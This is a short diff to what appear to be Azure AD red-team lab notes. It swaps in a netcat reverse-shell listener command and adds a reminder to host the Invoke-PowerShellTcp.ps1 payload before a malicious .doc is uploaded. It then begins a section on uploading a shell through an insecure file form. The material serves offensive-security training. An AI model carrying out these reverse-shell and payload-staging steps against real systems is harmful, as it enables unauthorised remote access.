@@ -376,11 +376,12 @@ Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx
 ```
 
 Now, start a listener on your student VM to catch the reverse shell: 
+```
+C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444 
+```
 
-```
-C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444 
-listening on [any] 4444 ...
-```
+- Before you upload the malicious ```.doc``` make sure you have hosted ```Invoke-PowerShellTcp.ps1``` in ```C:\xampp\htdocs```!!!
+
 ### App Services
 #### Insecure File Upload
 We find a vulnerable form to upload files into, now lets upload hilarious shell:-
